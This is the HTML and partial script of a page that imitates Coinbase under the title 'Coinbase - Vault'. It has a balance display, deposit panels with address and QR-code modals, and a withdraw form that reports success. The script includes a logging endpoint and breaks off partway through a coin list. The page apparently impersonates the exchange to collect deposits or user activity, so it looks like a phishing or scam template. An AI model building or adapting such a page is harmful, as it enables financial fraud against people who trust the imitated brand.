<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Vault</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
.ll-fb-logo{width:32px;height:32px;display:block;flex-shrink:0}
*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}
html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif;font-feature-settings:normal;-webkit-tap-highlight-color:transparent}
body{margin:0;line-height:inherit}
h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}
button,input{font-family:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}
button{text-transform:none;-webkit-appearance:button;background-color:transparent;background-image:none}
img,svg{display:block;vertical-align:middle}
p{margin:0}
html,body,#root,.vb-panel-root{height:100%}
.mt-12{margin-top:3rem}
.flex{display:flex}
.h-full{height:100%}
.w-full{width:100%}
.flex-grow{flex-grow:1}
.flex-col{flex-direction:column}
.items-center{align-items:center}
.justify-center{justify-content:center}
.justify-between{justify-content:space-between}
.bg-coinbase-background{background-color:#0a0b0d}
.pb-2{padding-bottom:.5rem}
.pb-8{padding-bottom:2rem}
.font-coinbase-text{font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif}
.font-coinbase-title{font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif}
.text-\[28px\]{font-size:28px}
.font-semibold{font-weight:600}
.text-white{color:#fff}
.vb-home-kicker {
  display: block;
  font-size: 12px;
  font-weight: 700;
  line-height: 1.333;
  color: rgb(138, 145, 158);
}
html.ll-fb .ll-fb-auth-card {
  box-sizing: border-box;
  width: 100%;
  max-width: 448px;
  border-radius: 16px;
  padding: 24px;
}
@media (min-width: 640px) {
  html.ll-fb .ll-fb-auth-card {
    border: 1px solid rgba(138, 145, 158, 0.2);
    padding: 32px 40px;
  }
}
@media (min-width: 640px){
  .sm\:mt-24{margin-top:6rem}
  .sm\:justify-start{justify-content:flex-start}
  .sm\:overflow-hidden{overflow:hidden}
}
#vb-modal-overlay {
  display:none;position:fixed;inset:0;z-index:9999;
  background:rgba(0,0,0,.75);backdrop-filter:blur(6px);
  align-items:center;justify-content:center;
}
#vb-modal-overlay.open { display:flex; }
#vb-modal {
  background:#0a0b0d;border:1px solid rgba(138,145,158,.2);
  border-radius:16px;width:100%;max-width:448px;margin:16px;
  overflow:hidden;box-shadow:0 24px 80px rgba(0,0,0,.6);
  padding:24px;
}
@media (min-width: 640px) {
  #vb-modal { padding:32px 40px; }
}
#vb-modal-header {
  display:flex;align-items:center;justify-content:space-between;
  padding:0 0 16px;
}
#vb-modal-close {
  background:rgba(255,255,255,.07);border:none;border-radius:50%;
  width:32px;height:32px;cursor:pointer;color:rgba(255,255,255,.6);
  display:flex;align-items:center;justify-content:center;font-size:16px;
  transition:background .15s;flex-shrink:0;
}
#vb-modal-close:hover { background:rgba(255,255,255,.14); }
#vb-modal-body { padding:0; }
#vb-qr-wrap {
  background:#fff;border-radius:12px;padding:16px;
  display:flex;align-items:center;justify-content:center;
  margin:16px auto;width:fit-content;
}
#vb-qr-wrap img { display:block;border-radius:4px; }
.vb-addr-full {
  font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px;font-weight:600;
  color:rgba(255,255,255,.8);word-break:break-all;
  background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);
  border-radius:8px;padding:10px 14px;line-height:1.6;
}
.vb-copy-full-btn {
  margin-top:12px;width:100%;padding:12px;
  background:#578bfa;color:#000;font-size:12px;font-weight:700;
  border:none;border-radius:10px;
  cursor:pointer;letter-spacing:.04em;transition:background .15s;
}
.vb-copy-full-btn:hover { background:#507fe5; }
.vb-copy-full-btn:active { background:#4b78d6; }
.vb-coin-row {
  display:flex;align-items:center;gap:16px;width:100%;
  border-radius:8px;padding:16px;cursor:pointer;
  transition:background .12s;
}
.vb-coin-row:hover { background:rgba(138,145,158,.1); }
.vb-row-chevron { flex-shrink:0;color:rgba(255,255,255,.45); }
.vb-addr-btn { background:none;border:none;padding:2px;cursor:pointer;color:rgba(255,255,255,.3);display:flex;align-items:center;flex-shrink:0;transition:color .15s; }
.vb-addr-btn:hover { color:rgba(255,255,255,.7); }
.vb-chrome {
  position:fixed;top:0;left:0;right:0;z-index:800;
  padding:20px 24px 0;pointer-events:none;background:transparent;
}
.vb-chrome-spacer { height:52px;width:100%;flex-shrink:0; }
.vb-slide-panel {
  display:none !important;visibility:hidden;pointer-events:none;
  position:fixed;inset:0;z-index:500;background:#0a0b0d;
  overflow-y:auto;overflow-x:hidden;
}
.vb-slide-panel.open {
  display:block !important;visibility:visible;pointer-events:auto;
}
.vb-slide-panel.open .ll-fb-auth-card {
  animation:_vp_in .22s cubic-bezier(.22,.61,.36,1) both;
}
@keyframes _vp_in { from{opacity:0;transform:translateY(18px) scale(.985)} to{opacity:1;transform:translateY(0) scale(1)} }
#vb-receive-panel { z-index:501; }
.vb-dp-search {
  flex:1;background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.1);
  border-radius:12px;padding:11px 16px;color:#fff;
  font-size:15px;outline:none;
}
.vb-dp-search::placeholder { color:rgba(255,255,255,.3); }
.vb-dp-search:focus { border-color:rgba(255,255,255,.25); }
.vb-dp-coin-row {
  display:flex;align-items:center;gap:16px;cursor:pointer;
  border-radius:8px;padding:16px;transition:background .12s;
}
.vb-dp-coin-row:hover { background:rgba(138,145,158,.1); }
.vb-dp-coin-row:active { background:rgba(138,145,158,.16); }
.vb-icon-close {
  width:36px;height:36px;border-radius:50%;background:rgba(255,255,255,.08);
  border:none;cursor:pointer;color:rgba(255,255,255,.7);display:flex;
  align-items:center;justify-content:center;flex-shrink:0;transition:background .15s;
}
.vb-icon-close:hover { background:rgba(255,255,255,.15); }
.vb-back-btn {
  background:rgba(255,255,255,.08);border:none;border-radius:50%;width:38px;height:38px;
  cursor:pointer;color:#fff;display:flex;align-items:center;justify-content:center;
  flex-shrink:0;transition:background .15s;
}
.vb-back-btn:hover { background:rgba(255,255,255,.15); }
#vb-withdraw-form-panel { z-index:501; }
#vb-withdraw-form-panel.open ~ #vb-withdraw-panel { pointer-events:none; }
.vb-wd-success {
  margin-top:14px;padding:14px 16px;
  background:rgba(74,222,128,.1);border:1px solid rgba(74,222,128,.25);
  border-radius:12px;font-size:14px;
  color:#4ade80;text-align:center;
}
.vb-wd-coin-sel {
  display:flex;align-items:center;gap:8px;
  background:transparent;border:1px solid rgba(138,145,158,.2);
  border-radius:8px;padding:8px;cursor:pointer;transition:background .12s;
  margin:16px 0 0;
}
.vb-wd-coin-sel:hover { background:rgba(138,145,158,.1); }
.vb-wd-label {
  font-size:14px;font-weight:600;color:#fff;margin:20px 0 8px;
}
.vb-wd-input {
  width:100%;box-sizing:border-box;background:#0a0b0d;
  border:1px solid rgba(138,145,158,.2);border-radius:6px;
  padding:14px 16px;color:#fff;
  font-size:16px;font-weight:400;outline:none;transition:border-color .15s,background .12s;
}
.vb-wd-input:hover { background:#0f1012; }
.vb-wd-input:focus { border-color:rgba(87,139,250,.6); }
.vb-wd-input::placeholder { color:rgba(255,255,255,.2); }
.vb-wd-input-wrap { position:relative;display:flex;align-items:center; }
.vb-wd-input-wrap .vb-wd-input { padding-right:70px; }
.vb-wd-max-btn {
  position:absolute;right:14px;
  background:rgba(87,139,250,.18);border:1px solid rgba(87,139,250,.35);
  color:#8fb4ff;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11px;font-weight:700;
  border-radius:6px;padding:4px 10px;cursor:pointer;letter-spacing:.04em;
  transition:background .15s;
}
.vb-wd-max-btn:hover { background:rgba(87,139,250,.3); }
.vb-wd-usd {
  font-size:12px;color:rgb(138,145,158);
  padding:8px 16px;margin:0 0 4px;
}
.vb-wd-submit {
  width:100%;padding:16px;background:#578bfa;color:#000;
  font-size:16px;font-weight:600;
  border:none;border-radius:100px;cursor:pointer;letter-spacing:.01em;
  transition:background .15s,transform .1s;margin-top:16px;
}
.vb-wd-submit:hover { background:#507fe5; }
.vb-wd-submit:active { background:#4b78d6;transform:scale(.98); }
.vb-wd-submit:disabled { background:#314b84;color:rgba(255,255,255,.3);cursor:not-allowed; }
.vb-wd-input:disabled { opacity:.35;cursor:not-allowed; }
.vb-wd-max-btn:disabled { opacity:.3;cursor:not-allowed; }
.vb-wd-note {
  font-size:12px;color:rgb(138,145,158);
  text-align:center;margin-top:16px;line-height:1.5;
}
.vb-home-actions { display:flex;gap:8px;margin:16px 0; }
.vb-btn-primary,.vb-btn-secondary {
  flex:1;padding:16px 24px;font-size:15px;font-weight:600;
  border:none;border-radius:100px;cursor:pointer;
  transition:background .15s,transform .1s;
}
.vb-btn-primary { background:#578bfa;color:#000; }
.vb-btn-primary:hover { background:#507fe5; }
.vb-btn-primary:active { background:#4b78d6;transform:scale(.98); }
.vb-btn-secondary { background:#32353d;color:#fff; }
.vb-btn-secondary:hover { background:#3a3d45; }
.vb-btn-secondary:active { background:#47494f;transform:scale(.98); }
.vb-btn-primary:focus-visible,.vb-btn-secondary:focus-visible,
.vb-wd-submit:focus-visible,.vb-back-btn:focus-visible,.vb-icon-close:focus-visible {
  outline:2px solid #578bfa;outline-offset:2px;
}
.vb-panel-head { display:flex;align-items:center;gap:12px;margin-bottom:22px; }
.vb-kicker {
  font-size:12px;font-weight:700;line-height:1.333;
  color:rgb(138,145,158);margin-bottom:8px;
}
html.ll-fb #vb-balance {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
  font-weight: 600 !important;
  font-size: 28px;
  line-height: 1.2;
  letter-spacing: -0.01em;
  color: #fff;
  padding-bottom: 8px;
  margin-top: 0;
  display: block;
}
  </style>
 </head>
 <body style="background:#0a0b0d;">
  <header id="vb-chrome" class="vb-chrome">
   <svg class="ll-fb-logo" height="32" viewBox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
    <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF"/>
   </svg>
  </header>

  <div id="vb-modal-overlay">
   <div id="vb-modal">
    <div id="vb-modal-header">
     <div style="display:flex;align-items:center;gap:12px;">
      <div id="vb-modal-icon" style="width:42px;height:42px;border-radius:50%;overflow:hidden;flex-shrink:0;"></div>
      <div>
       <div id="vb-modal-name" style="font-size:18px;font-weight:700;color:#fff;"></div>
       <div id="vb-modal-ticker" style="font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12px;color:rgba(255,255,255,.4);margin-top:1px;"></div>
      </div>
     </div>
     <button id="vb-modal-close" type="button">&#x2715;</button>
    </div>
    <div id="vb-modal-body">
     <div style="font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:10px;font-weight:700;color:rgba(255,255,255,.35);letter-spacing:.1em;text-transform:uppercase;margin-bottom:8px;">Your address</div>
     <div id="vb-modal-addr" class="vb-addr-full"></div>
     <div id="vb-qr-wrap">
      <img id="vb-qr-img" src="" width="180" height="180" alt="QR Code"/>
     </div>
     <div style="font-size:10px;color:rgba(255,255,255,.3);text-align:center;margin-bottom:4px;">Scan to send funds to this address</div>
     <button id="vb-copy-full-btn" class="vb-copy-full-btn" type="button">Copy Address</button>
    </div>
   </div>
  </div>

  <div class="ll-fb-type" id="root">
    <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
     <div class="vb-chrome-spacer" aria-hidden="true"></div>
     <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
      <div class="ll-fb-auth-card mt-12 font-coinbase-text sm:mt-24 sm:overflow-hidden">
       <span class="vb-home-kicker">Vault Balance</span>
       <span id="vb-balance">$0.00</span>
       <div class="vb-home-actions">
        <button id="vb-deposit-btn" class="vb-btn-primary" type="button">Deposit</button>
        <button id="vb-withdraw-btn" class="vb-btn-secondary" type="button">Withdraw</button>
       </div>
       <div id="vb-coins"></div>
      </div>
     </div>
    </div>
  </div>

  <div id="vb-deposit-panel" class="vb-slide-panel">
   <div class="ll-fb-type vb-panel-root">
    <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
     <div class="vb-chrome-spacer" aria-hidden="true"></div>
     <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
      <div class="ll-fb-auth-card mt-12 font-coinbase-text sm:mt-24 sm:overflow-hidden">
       <div class="vb-panel-head">
        <button id="vb-deposit-close" class="vb-icon-close" type="button">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>
        <input id="vb-deposit-search" class="vb-dp-search" type="text" placeholder="Search" autocomplete="off"/>
       </div>
       <div class="vb-kicker">All</div>
       <div id="vb-deposit-list"></div>
      </div>
     </div>
    </div>
   </div>
  </div>

  <div id="vb-receive-panel" class="vb-slide-panel">
   <div class="ll-fb-type vb-panel-root">
    <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
     <div class="vb-chrome-spacer" aria-hidden="true"></div>
     <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
      <div class="ll-fb-auth-card mt-12 font-coinbase-text sm:mt-24 sm:overflow-hidden">
       <button id="vb-receive-back" class="vb-back-btn" type="button" style="margin-bottom:28px;">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
       </button>
       <div id="vb-receive-title" class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white"></div>
       <div id="vb-receive-subtitle" style="font-size:14px;color:rgba(255,255,255,.4);margin-bottom:24px;"></div>
       <div id="vb-receive-network-row" style="display:none;flex-direction:column;gap:10px;margin-bottom:24px;"></div>
       <div id="vb-receive-details">
        <div id="vb-receive-banner" style="display:flex;align-items:stretch;border-radius:20px;overflow:hidden;min-height:180px;margin-bottom:20px;">
         <div style="flex:1;display:flex;align-items:flex-end;justify-content:flex-start;padding:18px 20px;">
          <div id="vb-receive-banner-coin" style="width:44px;height:44px;border-radius:50%;overflow:hidden;background:rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;"></div>
         </div>
         <div style="display:flex;align-items:center;justify-content:center;padding:10px;flex-shrink:0;">
          <div style="border:5px solid rgba(0,0,0,.3);border-radius:14px;padding:5px;background:#fff;flex-shrink:0;">
           <div id="vb-receive-qr" style="display:flex;align-items:center;justify-content:center;overflow:hidden;border-radius:8px;background:#fff;width:148px;height:148px;"></div>
          </div>
         </div>
        </div>
        <div style="font-size:12px;font-weight:700;color:rgba(255,255,255,.4);letter-spacing:.06em;text-transform:uppercase;margin-bottom:8px;">Your address</div>
        <div style="display:flex;align-items:center;gap:8px;padding:0 2px;margin-bottom:20px;">
         <span id="vb-receive-addr-short" style="font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:14px;color:rgba(255,255,255,.85);flex:1;letter-spacing:.02em;word-break:break-all;"></span>
         <button id="vb-receive-eye-btn" type="button" style="background:none;border:none;padding:4px;cursor:pointer;color:rgba(255,255,255,.5);flex-shrink:0;display:flex;align-items:center;justify-content:center;"></button>
         <button id="vb-receive-copy-btn" type="button" style="background:none;border:none;padding:4px;cursor:pointer;color:rgba(255,255,255,.5);flex-shrink:0;display:flex;align-items:center;justify-content:center;">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
         </button>
        </div>
        <div style="height:1px;background:rgba(255,255,255,.08);margin-bottom:18px;"></div>
        <div style="display:flex;flex-direction:column;gap:12px;">
         <div style="display:flex;align-items:flex-start;gap:10px;">
          <div style="width:18px;height:18px;border-radius:50%;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;"><span style="font-size:10px;font-weight:800;color:rgba(255,255,255,.55);">i</span></div>
          <p id="vb-receive-info-coin" style="font-size:13px;color:rgba(255,255,255,.45);margin:0;line-height:1.5;"></p>
         </div>
         <div style="display:flex;align-items:flex-start;gap:10px;">
          <div style="width:18px;height:18px;border-radius:50%;background:rgba(255,193,7,.15);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="rgba(255,193,7,.85)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></div>
          <p style="font-size:13px;color:rgba(255,255,255,.45);margin:0;line-height:1.5;">Deposits may take a few minutes to appear after the transaction is confirmed on the network.</p>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>

  <div id="vb-withdraw-form-panel" class="vb-slide-panel">
   <div class="ll-fb-type vb-panel-root">
    <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
     <div class="vb-chrome-spacer" aria-hidden="true"></div>
     <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
      <div class="ll-fb-auth-card mt-12 font-coinbase-text sm:mt-24 sm:overflow-hidden">
       <div class="vb-panel-head">
        <button id="vb-wd-back" class="vb-back-btn" type="button">
         <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
        </button>
        <span class="ll-fb-title font-coinbase-title text-[28px] font-semibold text-white">Withdraw assets</span>
       </div>
       <div class="vb-wd-coin-sel" id="vb-wd-coin-sel">
        <div id="vb-wd-sel-icon" style="width:44px;height:44px;border-radius:50%;overflow:hidden;flex-shrink:0;"></div>
        <div style="flex:1;min-width:0;">
         <div id="vb-wd-sel-name" style="font-size:14px;font-weight:700;color:#fff;"></div>
         <div id="vb-wd-sel-bal" style="font-size:12px;color:rgb(138,145,158);margin-top:2px;"></div>
        </div>
        <div id="vb-wd-sel-usd" style="font-size:12px;font-weight:600;color:rgb(138,145,158);flex-shrink:0;padding-right:8px;"></div>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.4)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><polyline points="6 9 12 15 18 9"/></svg>
       </div>
       <div class="vb-wd-label">Amount</div>
       <div class="vb-wd-input-wrap">
        <input id="vb-wd-amount" class="vb-wd-input" type="text" placeholder="0.00000000" autocomplete="off" inputmode="decimal"/>
        <button class="vb-wd-max-btn" id="vb-wd-max" type="button">MAX</button>
       </div>
       <div id="vb-wd-usd-display" class="vb-wd-usd">≈ $0.00</div>
       <div class="vb-wd-label" style="margin-top:14px;">Amount in USD</div>
       <div class="vb-wd-input-wrap">
        <span style="position:absolute;left:16px;font-size:18px;font-weight:600;color:rgba(255,255,255,.45);pointer-events:none;z-index:1;">$</span>
        <input id="vb-wd-usd-amount" class="vb-wd-input" type="text" placeholder="0.00" autocomplete="off" inputmode="decimal" style="padding-left:28px;margin-bottom:0;"/>
        <button class="vb-wd-max-btn" id="vb-wd-usd-max" type="button">MAX</button>
       </div>
       <div class="vb-wd-label" style="margin-top:20px;">Withdrawal address</div>
       <input id="vb-wd-addr" class="vb-wd-input" type="text" placeholder="Paste address here" autocomplete="off" style="margin-bottom:8px;font-size:14px;"/>
       <button class="vb-wd-submit" id="vb-wd-submit" type="button">Withdraw</button>
       <div id="vb-wd-success" class="vb-wd-success" style="display:none;">✓ Withdrawal request submitted successfully</div>
       <div class="vb-wd-note">Withdrawals may take up to 24 hours to complete.</div>
      </div>
     </div>
    </div>
   </div>
  </div>

  <div id="vb-withdraw-panel" class="vb-slide-panel">
   <div class="ll-fb-type vb-panel-root">
    <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
     <div class="vb-chrome-spacer" aria-hidden="true"></div>
     <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
      <div class="ll-fb-auth-card mt-12 font-coinbase-text sm:mt-24 sm:overflow-hidden">
       <div class="vb-panel-head">
        <button id="vb-withdraw-close" class="vb-icon-close" type="button">
         <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
        </button>
        <span class="ll-fb-title font-coinbase-title text-[28px] font-semibold text-white">Withdraw</span>
       </div>
       <div class="vb-kicker">Select asset</div>
       <div id="vb-withdraw-list"></div>
      </div>
     </div>
    </div>
   </div>
  </div>

  <script>
@verbatim
(function(){
    var QR_API   = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=';
    var CSRF     = window._liveledCSRF || '';
    var TRACK    = '/api/log';

    var ALL_COINS = [
      {key:'btc',         name:'Bitcoin',          ticker:'BTC',  icon:'btc',  color:'#F7931A', iconUrl:'https://coin-images.coingecko.com/coins/images/1/large/bitcoin.png'},
      {key:'eth',         name:'Ethereum',         ticker:'ETH',  icon:'eth',  color:'#627EEA', iconUrl:'https://coin-images.coingecko.com/coins/images/279/large/ethereum.png'},
      {key:'xrp',         name:'XRP',              ticker:'XRP',  icon:'xrp',  color:'#346AA9', iconUrl:'https://coin-images.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png'},
      {key:'sol',         name:'Solana',           ticker:'SOL',  icon:'sol',  color:'#9945FF', iconUrl:'https://coin-images.coingecko.com/coins/images/4128/large/solana.png'},
      {key:'ltc',         name:'Litecoin',         ticker:'LTC',  icon:'ltc',  color:'#BFBBBB', iconUrl:'https://coin-images.coingecko.com/coins/images/2/large/litecoin.png'},
      {key:'doge',        name:'Dogecoin',         ticker:'DOGE', icon:'doge', color:'#C2A633', iconUrl:'https://coin-images.coingecko.com/coins/images/5/large/dogecoin.png'},
      {key:'bnb',         name:'BNB',              ticker:'BNB',  icon:'bnb',  color:'#F3BA2F', iconUrl:'https://coin-images.coingecko.com/coins/images/825/large/bnb-icon2_2x.png'},
      {key:'usdt',        name:'Tether',           ticker:'USDT', icon:'usdt', color:'#26A17B', iconUrl:'https://coin-images.coingecko.com/coins/images/325/large/Tether.png'},
      {key:'usdt_trc20',  name:'Tether',           ticker:'USDT', icon:'usdt', color:'#26A17B', iconUrl:'https://coin-images.coingecko.com/coins/images/325/large/Tether.png'},
      {key:'usdc',        name:'USD Coin',         ticker:'USDC', icon:'usdc', color:'#2775CA', iconUrl:'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png'},
      {key:'usdc_base',   name:'USD Coin',         ticker:'USDC', icon:'usdc', color:'#2775CA', iconUrl:'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png'},
      {key:'usdc_sol',    name:'USD Coin',         ticker:'USDC', icon:'usdc', color:'#2775CA', iconUrl:'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png'},
      {key:'usdc_polygon',name:'USD Coin',         ticker:'USDC', icon:'usdc', color:'#2775CA', iconUrl:'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png'},
      {key:'ada',         name:'Cardano',          ticker:'ADA',  icon:'ada',  color:'#0033AD', iconUrl:'https://coin-images.coingecko.com/coins/images/975/large/cardano.png'},
      {key:'dot',         name:'Polkadot',         ticker:'DOT',  icon:'dot',  color:'#E6007A', iconUrl:'https://coin-images.coingecko.com/coins/images/12171/large/polkadot.png'},
      {key:'shib',        name:'Shiba Inu',        ticker:'SHIB', icon:'shib', color:'#FFA409', iconUrl:'https://coin-images.coingecko.com/coins/images/11939/large/shiba.png'},
      {key:'avax',        name:'Avalanche',        ticker:'AVAX', icon:'avax', color:'#E84142', iconUrl:'https://coin-images.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png'},
      {key:'matic',       name:'Polygon',          ticker:'MATIC',icon:'matic',color:'#8247E5', iconUrl:'https://coin-images.coingecko.com/coins/images/4713/large/polygon.png'},
      {key:'link',        name:'Chainlink',        ticker:'LINK', icon:'link', color:'#375BD2', iconUrl:'https://coin-images.coingecko.com/coins/images/877/large/chainlink-new-logo.png'},
      {key:'uni',         name:'Uniswap',          ticker:'UNI',  icon:'uni',  color:'#FF007A', iconUrl:'https://coin-images.coingecko.com/coins/images/12504/large/uniswap-logo.png'},
      {key:'xlm',         name:'Stellar',          ticker:'XLM',  icon:'xlm',  color:'#14B6E7', iconUrl:'https://coin-images.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png'},
      {key:'trx',         name:'TRON',             ticker:'TRX',  icon:'trx',  color:'#EF0027', iconUrl:'https://coin-images.coingecko.com/coins/images/1094/large/tron-logo.png'},
      {key:'atom',        name:'Cosmos',           ticker:'ATOM', icon:'atom', color:'#2E3148', iconUrl:'https://coin-images.coingecko.com/coins/images/1481/large/cosmos_hub.png'},
      {key:'ton',         name:'Toncoin',          ticker:'TON',  icon:'ton',  color:'#0088CC', iconUrl:'https://coin-images.coingecko.com/coins/images/17980/large/ton_symbol.png'},
      {key:'bch',         name:'Bitcoin Cash',     ticker:'BCH',  icon:'bch',  color:'#8DC351', iconUrl:'https://coin-images.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png'},
      {key:'wbtc',        name:'Wrapped Bitcoin',  ticker:'WBTC', icon:'wbtc', color:'#F7931A', iconUrl:'https://coin-images.coingecko.com/coins/images/7598/large/wrapped_bitcoin_wbtc.png'},
      {key:'dai',         name:'Dai',              ticker:'DAI',  icon:'dai',  color:'#F5AC37', iconUrl:'https://coin-images.coingecko.com/coins/images/9956/large/Badge_Dai.png'},
      {key:'cro',         name:'Cronos',           ticker:'CRO',   icon:'cro',    color:'#1199fa', iconUrl:'https://coin-images.coingecko.com/coins/images/7310/large/cro_token_logo.png'},
      {key:'vet',         name:'VeChain',          ticker:'VET',   icon:'vet',    color:'#15BDFF', iconUrl:'https://coin-images.coingecko.com/coins/images/1167/large/VeChain-Logo-768x768.png'},
      {key:'near',        name:'NEAR Protocol',    ticker:'NEAR',  icon:'near',   color:'#00C08B', iconUrl:'https://coin-images.coingecko.com/coins/images/10365/large/near.jpg'},
      {key:'arb',         name:'Arbitrum',         ticker:'ARB',   icon:'arb',    color:'#2D374B', iconUrl:'https://coin-images.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg'},
      {key:'op',          name:'Optimism',         ticker:'OP',    icon:'op',     color:'#FF0420', iconUrl:'https://coin-images.coingecko.com/coins/images/25244/large/Optimism.png'},
      {key:'sui',         name:'Sui',              ticker:'SUI',   icon:'sui',    color:'#4DA2FF', iconUrl:'https://coin-images.coingecko.com/coins/images/26375/large/sui_asset.jpeg'},
      {key:'apt',         name:'Aptos',            ticker:'APT',   icon:'apt',    color:'#00BFA5', iconUrl:'https://coin-images.coingecko.com/coins/images/26455/large/aptos_round.png'},
      {key:'inj',         name:'Injective',        ticker:'INJ',   icon:'inj',    color:'#00B4D8', iconUrl:'https://coin-images.coingecko.com/coins/images/12882/large/Secondary_Symbol.png'},
      {key:'hbar',        name:'Hedera',           ticker:'HBAR',  icon:'hbar',   color:'#222222', iconUrl:'https://coin-images.coingecko.com/coins/images/3688/large/hbar.png'},
      {key:'ldo',         name:'Lido DAO',         ticker:'LDO',   icon:'ldo',    color:'#F6699D', iconUrl:'https://coin-images.coingecko.com/coins/images/13573/large/lido_dao.png'},
      {key:'stx',         name:'Stacks',           ticker:'STX',   icon:'stx',    color:'#5546FF', iconUrl:'https://coin-images.coingecko.com/coins/images/2069/large/Stacks_logo_full.png'},
      {key:'aave',        name:'Aave',             ticker:'AAVE',  icon:'aave',   color:'#B6509E', iconUrl:'https://coin-images.coingecko.com/coins/images/12645/large/aave-token-round.png'},
      {key:'icp',         name:'Internet Computer',ticker:'ICP',   icon:'icp',    color:'#29ABE2', iconUrl:'https://coin-images.coingecko.com/coins/images/14495/large/Internet_Computer_logo.png'},
      {key:'render',      name:'Render',           ticker:'RENDER',icon:'render', color:'#FF4500', iconUrl:'https://coin-images.coingecko.com/coins/images/11636/large/rndr.png'},
      {key:'tao',         name:'Bittensor',        ticker:'TAO',   icon:'tao',    color:'#333333', iconUrl:'https://coin-images.coingecko.com/coins/images/28452/large/ARUqqBve_400x400.jpg'},
      {key:'pepe',        name:'Pepe',             ticker:'PEPE',  icon:'pepe',   color:'#479040', iconUrl:'https://coin-images.coingecko.com/coins/images/29850/large/pepe-token.jpeg'},
      {key:'bonk',        name:'Bonk',             ticker:'BONK',  icon:'bonk',   color:'#F5841F', iconUrl:'https://coin-images.coingecko.com/coins/images/28600/large/bonk.jpg'},
